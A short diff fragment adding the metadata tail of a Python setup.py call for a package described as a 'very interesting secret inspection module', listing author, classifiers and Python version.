+    description=""very interesting secret inspection module"",
+    long_description=open('README.md').read(),
+    long_description_content_type=""text/markdown"",
+    author=""jake"",
+    author_email=""jake46@example.com"",
+    classifiers=[
+        ""Programming Language :: Python :: 3"",
+        ""License :: OSI Approved :: MIT License"",
+        ""Operating System :: OS Independent"",
+    ],
+    python_requires='>=3.6',
+)"
